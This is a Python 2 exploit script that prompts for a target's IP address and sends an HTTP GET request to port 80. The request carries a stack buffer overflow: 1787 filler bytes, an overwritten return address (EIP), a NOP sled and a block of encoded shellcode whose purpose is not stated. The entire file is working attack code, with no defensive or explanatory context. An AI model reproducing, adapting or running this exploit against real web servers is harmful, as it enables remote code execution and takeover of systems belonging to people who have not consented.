import socket
import sys


ip = raw_input("Enter targets' IP :- ")  # getting victims' IP as user input

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

while True:
    if (ip == ""):
        ip = raw_input("Please enter targets' IP :- ")
    else : break

port = 80
''' because that web service runs on port 80, and we're sending http request 
to that port instead of sending it through a browser '''

s.connect((ip,port))

buff = "GET "  # because we're sending get request

buf =  ""
buf += "\xda\xca\xba\x3a\x0e\xfd\xaa\xd9\x74\x24\xf4\x5f\x2b"
buf += "\xc9\xb1\x54\x83\xef\xfc\x31\x57\x14\x03\x57\x2e\xec"
buf += "\x08\x56\xa6\x72\xf2\xa7\x36\x13\x7a\x42\x07\x13\x18"
buf += "\x06\x37\xa3\x6a\x4a\xbb\x48\x3e\x7f\x48\x3c\x97\x70"
buf += "\xf9\x8b\xc1\xbf\xfa\xa0\x32\xa1\x78\xbb\x66\x01\x41"
buf += "\x74\x7b\x40\x86\x69\x76\x10\x5f\xe5\x25\x85\xd4\xb3"
buf += "\xf5\x2e\xa6\x52\x7e\xd2\x7e\x54\xaf\x45\xf5\x0f\x6f"
buf += "\x67\xda\x3b\x26\x7f\x3f\x01\xf0\xf4\x8b\xfd\x03\xdd"
buf += "\xc2\xfe\xa8\x20\xeb\x0c\xb0\x65\xcb\xee\xc7\x9f\x28"
buf += "\x92\xdf\x5b\x53\x48\x55\x78\xf3\x1b\xcd\xa4\x02\xcf"
buf += "\x88\x2f\x08\xa4\xdf\x68\x0c\x3b\x33\x03\x28\xb0\xb2"
buf += "\xc4\xb9\x82\x90\xc0\xe2\x51\xb8\x51\x4e\x37\xc5\x82"
buf += "\x31\xe8\x63\xc8\xdf\xfd\x19\x93\xb7\x32\x10\x2c\x47"
buf += "\x5d\x23\x5f\x75\xc2\x9f\xf7\x35\x8b\x39\x0f\x3a\xa6"
buf += "\xfe\x9f\xc5\x49\xff\xb6\x01\x1d\xaf\xa0\xa0\x1e\x24"
buf += "\x31\x4d\xcb\xd1\x3b\xd9\x34\x8d\x3d\x70\xdd\xcc\x3d"
buf += "\x93\xca\x58\xdb\xc3\xa4\x0a\x74\xa3\x14\xeb\x24\x4b"
buf += "\x7f\xe4\x1b\x6b\x80\x2e\x34\x01\x6f\x87\x6c\xbd\x16"
buf += "\x82\xe7\x5c\xd6\x18\x82\x5e\x5c\xa9\x72\x10\x95\xd8"
buf += "\x60\x44\xc4\x22\x79\x94\x6d\x23\x13\x90\x27\x74\x8b"
buf += "\x9a\x1e\xb2\x14\x65\x75\xc0\x53\x99\x08\xf1\x28\xaf"
buf += "\x9e\xbd\x46\xcf\x4e\x3e\x97\x99\x04\x3e\xff\x7d\x7d"
buf += "\x6d\x1a\x82\xa8\x01\xb7\x16\x53\x70\x6b\xb1\x3b\x7e"
buf += "\x52\xf5\xe3\x81\xb1\x86\xe4\x7e\x47\xaa\x4c\x17\xb7"
buf += "\xea\x6c\xe7\xdd\xea\x3c\x8f\x2a\xc5\xb3\x7f\xd2\xcc"
buf += "\x9b\x17\x59\x80\x6e\x89\x5e\x89\x2f\x17\x5e\x3d\xf4"
buf += "\x4e\xd1\xc2\x0b\x6f\x13\xff\xdd\x56\x61\x38\xde\xec"
buf += "\x7a\x73\x43\x44\x11\x7b\xd7\x96\x30"

eip = "\x53\x93\x42\x7e"
esp = buf
noop = "\x90"*20

buff += "A" * 1787 + eip + noop + esp
buff += " HTTP/1.1\r\n\r\n" # protocol and the version
s.send(buff)
s.close()

